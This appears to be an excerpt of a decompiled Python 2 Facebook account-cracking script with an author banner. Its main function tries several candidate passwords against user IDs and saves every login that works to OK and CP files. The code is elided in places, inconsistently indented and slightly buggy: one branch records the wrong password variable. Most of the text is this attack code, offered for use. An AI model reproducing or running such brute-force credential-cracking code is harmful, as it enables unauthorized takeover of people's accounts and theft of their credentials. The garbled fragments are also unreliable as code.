# Decompiled By SABA KHAN 
# Github : https://github.com/SABAKHAN6T6
# uncompyle6 version 3.7.4
# Original written By SABA KHAN
...
logo = """
    ...
    \x1b[1;96m    ____    _    ____    _    
    \x1b[1;96m / ___|  / \  | __ )  / \    
    \x1b[1;96m \___ \ / _ \ |  _ \ / _ \  
    \x1b[1;96m  ___) / ___ \| |_) / ___ \ 
    \x1b[1;96m |____/_/   \_\____/_/   \_\
    \x1b[1;96m                             
                                                                                                                                                                      
\x1b[1;96m_________________________________________________
\x1b[1;96m\033[1;96mAuthor   :            SABA KHAN
\x1b[1;96m\033[1;96mFacebook :         SABA KHAN
\x1b[1;96m\033[1;96mGitHub   :             SABAKHAN6T6
\x1b[1;96m\033[1;96mVersion  :              KOKO JENY
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [SABA_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [SABA_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [SABA_Temp_Lock] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [SABA_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [SABA_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SABA_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [SABA_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SABA_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
